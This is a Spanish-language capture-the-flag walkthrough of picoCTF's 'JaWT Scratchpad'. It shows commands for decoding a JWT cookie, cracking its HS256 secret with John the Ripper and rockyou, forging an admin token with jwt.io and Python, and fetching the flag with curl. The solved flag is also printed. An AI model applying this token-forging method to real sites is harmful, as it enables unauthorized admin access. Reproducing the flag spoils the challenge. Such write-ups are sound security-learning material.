# JaWT Scratchpad

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090

- hints
	- What is that cookie?
	- Have you heard of JWT?


## Solución
#### Explicar los antecendentes
- Qué es un token JWT 
	- google: jwt, intro explicar sus 3 partes: https://jwt.io/introduction

- Al inicio aparece esto
```
JaWT

powered by JWT
Welcome to JaWT!

JaWT is an online scratchpad, where you can "jot" down whatever you'd like! Consider it a notebook for your thoughts. JaWT works best in Google Chrome for some reason.

You will need to log in to access the JaWT scratchpad. You can use any name, other than admin... because the admin user gets a special scratchpad!

[                  ]

Register with your name!

You can use your name as a log in, because that's quick and easy to remember! If you don't like your name, use a short and cool one like John!

```
- Si intento loguerme como admin, me sale mensaje
```
 YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT. 
```

- Asi que usamos otro nombre de usuario diferente: carlos
```
## Hello carlos!

Here is your JaWT scratchpad!

  
[logout]
```

- miramos la cookie que se formo, con el cookie editor:
```
name:jwt
value: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2FybG9zIn0.ibA8ZjnNXLYfuOIQWln6-CmmzUhw-bsu3BivkwnNYDk
```
- Intentamos decodificarlo de base 64, para entenderlo
```bash
❯ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSm9obiJ9.K1Omo0Gk5saKwJTkkgT7PUZohD7USknEE0lmT2AYAiM" | base64 -d
Invalid character in input stream.
❯ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
{"typ":"JWT","alg":"HS256"}%                                                                                                                        ❯ echo "eyJ1c2VyIjoiSm9obiJ9" | base64 -d
{"user":"John"}%                                                                                                                                    ❯ echo "K1Omo0Gk5saKwJTkkgT7PUZohD7USknEE0lmT2AYAiM" | base64 -d
+S??A??Ɗ????=Fh?>?JI?IfO`%    
```

- lo llevamos al jwt.io , y cambio por admin, meto a la cookie, refresco, no jala por que requiero la firma:

```
Internal Server Error

The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
```

### Crackerar la firma
- En la parte de abajo sugiere john como nombre, es una pista
- hay que llevarse la parte de la firma a crackar con jhon
 
	. google: https://www.openwall.com/john/
	. ver los parametros en la consola: john
	. explicar rockyou , desempacarlo, mostrar su contenido
	. desempacar
	john hash -w=/usr/share/wordlists/r.txt

```bash
──(kali㉿kali)-[~]
└─$ cat hash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2FybG9zIn0.ibA8ZjnNXLYfuOIQWln6-CmmzUhw-bsu3BivkwnNYDk
                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:01 DONE (2022-09-12 23:51) 0.6756g/s 4998Kp/s 4998Kc/s 4998KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

- el pass resulto ser:  ilovepico

### Frimar token de admin

. una vez con la llave, regresar a jwt.io, desencriptar el jwt
. ponerle admin, volverlo a encriptar con la llave


### Loquearse
. llevarlo ala cookie y loguerase
- refrescar a pagina

```
## Hello admin!

Here is your JaWT scratchpad!

picoCTF{jawt_was_just_what_you_thought_f859ab2f}
```


## Consola
```bash
curl -s http://jupiter.challenges.picoctf.org:63090/ -H "Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s" | grep pico
					<textarea style="margin: 0 auto; display: block;">picoCTF{jawt_was_just_what_you_thought_f859ab2f}</textarea>

```
### Solucion 2 python

```
import jwt

clave = "ilovepico"

payload = {
        "user": "admin"
}

token = jwt.encode(payload, clave, algorithm="HS256")

print(token)



```


```
curl -s http://jupiter.challenges.picoctf.org:61864/ -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.di2J1a0H3IhZtGmIfw7ltVq7sZL2orh8WIP1isDkgdw" | grep pico

```
## Referencias

- https://jwt.io/
- https://jwt.io/introduction

- JSON: https://en.wikipedia.org/wiki/JSON
- JWT : https://jwt.io/introduction
- jwt.io : https://jwt.io/#debugger-io
- john : https://github.com/openwall/john
